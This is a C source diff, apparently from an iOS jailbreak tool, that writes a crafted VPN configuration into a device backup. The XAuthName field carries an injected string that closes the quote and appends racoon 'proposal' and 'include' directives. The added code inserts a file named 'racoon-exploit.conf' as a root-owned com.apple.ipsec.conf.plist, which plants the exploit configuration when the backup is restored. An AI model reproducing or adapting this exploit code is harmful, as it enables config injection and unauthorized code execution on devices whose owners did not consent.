@@ -330,7 +330,7 @@ static void prefs_add_entry(plist_t* pl) /*{{{*/
 	plist_dict_insert_item(dict, "AuthenticationMethod", plist_new_string("SharedSecret"));
 	plist_dict_insert_item(dict, "RemoteAddress", plist_new_string("127.0.0.1"));
 	plist_dict_insert_item(dict, "LocalIdentifier", plist_new_string("2"));
-	plist_dict_insert_item(dict, "XAuthName", plist_new_string("pod2g\"; proposal {authentication_method xauth_psk_client; hash_algorithm sha1; encryption_algorithm aes 256; lifetime time 3600 sec; dh_group 2;} } include \"/private/var/preferences/SystemConfiguration/com.apple.ipsec.plist"));
+	plist_dict_insert_item(dict, "XAuthName", plist_new_string("pod2g\"; proposal {authentication_method xauth_psk_client; hash_algorithm sha1; encryption_algorithm aes 256; lifetime time 3600 sec; dh_group 2;} } include \"/private/var/preferences/SystemConfiguration/com.apple.ipsec.conf.plist"));
 	plist_dict_insert_item(dict, "LocalIdentifierType", plist_new_string("KeyID"));
 	plist_dict_insert_item(dict, "XAuthEnabled", plist_new_uint(1));
 	plist_dict_insert_item(dict, "SharedSecretEncryption", plist_new_string("Key"));
@@ -522,6 +522,9 @@ int main(int argc, char** argv)
 		return -1;
 	}
 
+	/*
+	 * com.apple.ipsec.plist
+	 */
 	backup_file_t* bf;
 	bf = backup_get_file(backup, "SystemPreferencesDomain", "SystemConfiguration/com.apple.ipsec.plist");
 	if (bf) {
@@ -560,6 +563,56 @@ int main(int argc, char** argv)
 	}
 	backup_file_free(bf);
 
+	/*
+	 * com.apple.ipsec.conf.plist
+	 */
+	char* ipsec_conf = NULL;
+	char* ipsec_conf_size = 0;
+	file_read("racoon-exploit.conf", &ipsec_conf, &ipsec_conf_size);
+	if(ipsec_conf != NULL && ipsec_conf_size > 0) {
+		bf = backup_get_file(backup, "SystemPreferencesDomain", "SystemConfiguration/com.apple.ipsec.conf.plist");
+		if (bf) {
+			fprintf(stderr, "com.apple.ipsec.conf.plist already present, replacing\n");
+			backup_file_assign_file_data(bf, ipsec_conf, strlen(ipsec_conf), 0);
+			backup_file_set_length(bf, strlen(ipsec_conf));
+			backup_file_update_hash(bf);
+
+			if (backup_update_file(backup, bf) < 0) {
+				fprintf(stderr, "ERROR: could not add file to backup\n");
+			} else {
+				backup_write_mbdb(backup);
+			}
+		} else {
+			fprintf(stderr, "adding com.apple.ipsec.conf.plist\n");
+			bf = backup_file_create_with_data(ipsec_conf, strlen(ipsec_conf), 0);
+			backup_file_set_domain(bf, "SystemPreferencesDomain");
+			backup_file_set_path(bf, "SystemConfiguration/com.apple.ipsec.conf.plist");
+			backup_file_set_mode(bf, 0100644);
+			backup_file_set_inode(bf, 123456);
+			backup_file_set_uid(bf, 0);
+			backup_file_set_gid(bf, 0);
+			unsigned int tm = (unsigned int)(time(NULL));
+			backup_file_set_time1(bf, tm);
+			backup_file_set_time2(bf, tm);
+			backup_file_set_time3(bf, tm);
+			backup_file_set_length(bf, strlen(ipsec_conf));
+			backup_file_set_flag(bf, 4);
+			backup_file_update_hash(bf);
+
+			if (backup_update_file(backup, bf) < 0) {
+				fprintf(stderr, "ERROR: could not add file to backup\n");
+			} else {
+				backup_write_mbdb(backup);
+			}
+		}
+		backup_file_free(bf);
+	} else {
+		fprintf(stderr, "Unable to find racoon-exploit.conf\n");
+	}
+
+	/*
+	 * prefrences.plist
+	 */
 	bf = backup_get_file(backup, "SystemPreferencesDomain", "SystemConfiguration/preferences.plist");
 	if (bf) {
 		char* fn = backup_get_file_path(backup, bf);
